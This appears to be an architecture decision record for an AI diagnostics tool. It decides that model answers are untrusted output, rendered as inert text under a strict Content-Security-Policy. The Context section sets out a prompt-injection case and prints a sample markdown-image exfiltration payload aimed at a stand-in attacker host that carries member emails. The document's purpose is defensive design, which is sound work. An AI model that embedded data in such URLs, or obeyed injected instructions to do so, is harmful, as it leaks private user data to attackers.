# ADR-008: The Answer Output Channel — Inert Render, Strict CSP, and Untrusted Model Output

## Status

Proposed — foundation decision for epic #2369 (AI Diagnostics), pending owner
approval on issue #2370. To be marked Accepted when this ADR's pull request
merges.

**Governance:** no implementation child (#2371–#2379) may weaken the contract in
this ADR without an owner decision recorded on-repo. In particular, AID-7
(#2378) — the Diagnostics shell UI — is built against this contract: it may not
relax the inert-render rule or the Diagnostics CSP without an owner decision.

## Context

ADR-002, ADR-003, and ADR-007 harden every **inbound** path: the question and
page reference are untrusted (TB1), evidence never authorizes a tool (TB3), and
tools reach the database only through a SELECT-only role (TB4). But a diagnostics
answer does not stop at the substrate — it travels **back out** through the shell
to the admin's browser and is **rendered** there. That return path is its own
trust boundary (threat model TB7), and none of the inbound ADRs constrains it.

This matters because the return path is the modern prompt-injection exfiltration
channel. ADR-003 makes an injection in evidence unable to *call a tool* it should
not; it does **not** stop an injection from steering the model to embed data the
caller **is** authorized to read into its *rendered answer*. The classic vector
is a markdown image or link whose URL carries the data — for example
`![](https://attacker/x?d=<member emails>)` — written into a guest name, a
booking note, or a private-overlay snippet. When the shell renders that answer,
the admin's browser **auto-fetches the image** (or follows the link) and beacons
the in-scope data to the attacker. No tool was mis-authorized and no out-of-scope
row was read; the data left through the browser on render.

ADR-002's "evidence never authorizes a tool" blocks *out-of-scope* tool calls,
not *in-scope steering* of the answer's content, and ADR-004's opt-in inclusion
keeps un-opted-in PII out of context but does nothing about data the operator did
legitimately include. The answer channel therefore needs its own contract.

## Decision

### 1. The model's answer is untrusted output

The model's answer is treated as **untrusted, injection-shaped output**, exactly
as evidence is treated as untrusted input (ADR-003). It is never rendered as
active content and never trusted to name a network destination. Its text may have
been steered by an injection in evidence, so the shell renders it defensively
rather than faithfully.

### 2. The shell renders answers as inert text only (AID-7 #2378)

The Diagnostics shell renders an answer as **inert text**, with **no** channel
that resolves to a network fetch or executes:

- **no auto-loaded images** — no `<img>`, no markdown `![]()`, no CSS
  `background-image`, no `<image>`/SVG external reference;
- **no arbitrary hyperlinks** — a URL that appears in the answer text is not made
  into a live, clickable link to an attacker-chosen host. If a reference is shown
  as a link at all, it resolves only to a **same-origin, allowlisted internal
  route**, never to a URL derived from the answer or from evidence;
- **no `data:` URIs** and no other embeddable scheme (`blob:`, `javascript:`);
- **no raw HTML or script** — the answer is never injected as HTML; any markdown
  is rendered through a sanitiser that drops images, embeds, and event handlers
  and neutralises links per the rules above, or the answer is shown as plain
  text.

Citations (ADR-003) are rendered as **inert typed references** — the tool id and
the record/knowledge reference — not as clickable arbitrary URLs. Presenting a
citation must not itself open a network channel.

### 3. A strict egress-controlling CSP on the Diagnostics surface

The Diagnostics surface carries its **own strict Content-Security-Policy** so
that, even if a render gap let active markup through, the browser cannot beacon:

- `default-src 'self'`; `img-src 'self'` (or `'none'` where the surface shows no
  images) — **never** a wildcard host and **never** `data:`;
- `connect-src 'self'` — no cross-origin `fetch`/XHR/WebSocket/beacon;
- `script-src` limited to the application's own bundle (no inline/eval beyond what
  the app already requires); `object-src 'none'`; `frame-src 'none'`;
  `base-uri 'self'`; `form-action 'self'`.

The CSP is defence-in-depth **beneath** the inert-render rule, not a substitute
for it (mirroring ADR-007's role-vs-tool-contract framing): render sanitisation
stops the markup, and the CSP stops the egress if sanitisation ever fails. The
two layers are independent, and the fallback of both is plain text — no image, no
outbound request. The exact directive values are finalised in AID-7 (#2378) and
release-hardened in AID-8 (#2379); this ADR fixes their **shape** — same-origin
only, no `data:`, no wildcard `img-src`/`connect-src` — exactly as ADR-005 fixes
that the loop bounds exist while AID-2 sets their numbers.

### 4. Fail-closed to plain text

If the answer contains an image, a hyperlink, or any active markup, the shell
**strips or neutralises it** and renders the remaining inert text; it never
"best-effort" renders the active form. An answer the sanitiser cannot render
safely is shown as plain text, never as HTML. This matches the threat model's
default of *deny + explain*, never *assume + proceed*.

## Consequences

### Positive

- The modern injection-to-exfiltration channel is closed: an injection can no
  longer turn an authorized, in-scope read into an outbound beacon from the
  admin's browser, because the answer never auto-fetches and the CSP blocks
  cross-origin egress regardless.
- The output channel gets the same first-class, reviewable posture the input
  channel already has (ADR-003) — a reviewer can reject any child PR that renders
  a Diagnostics answer as HTML, auto-loads an image, links to an evidence-derived
  URL, or relaxes the Diagnostics CSP.
- AID-7 (#2378) has a concrete render/CSP contract to implement and AID-8 (#2379)
  a concrete surface to hardening-test, rather than a general "sanitise output"
  aspiration.

### Negative

- Rich, clickable answers (live links, inline diagrams/screens) are deliberately
  out of scope on this surface; the answer is text with inert typed citations.
  This is the intended trade-off for an admin tool over sensitive data.
- The Diagnostics surface needs its own CSP wiring distinct from the rest of the
  admin app, and its render path needs sanitiser coverage and tests — more
  surface to build and hardening-test (AID-7/AID-8).

## Related

- ADR-001 (read-only product; no screenshots/DOM scraping; the answer is one of
  the few things that reaches the client)
- ADR-002 (evidence never authorizes a tool — the inbound counterpart; this ADR
  covers the in-scope steering ADR-002 does not)
- ADR-003 (all evidence is untrusted input; this ADR makes the model's answer
  untrusted output and renders inert typed citations)
- ADR-004 (opt-in PII keeps un-opted-in data out of context; this ADR protects
  data the operator did legitimately include)
- [Threat model](../threat-model.md) — trust boundary **TB7**, threat **I4**, and
  abuse case **AC8** (output-channel exfiltration).
- [`docs/agents/PROMPT_INJECTION_GUIDE.md`](../../agents/PROMPT_INJECTION_GUIDE.md)
- [`SECURITY-ATTACK-SURFACE.md`](../../SECURITY-ATTACK-SURFACE.md) — the platform
  CSP posture this surface tightens.
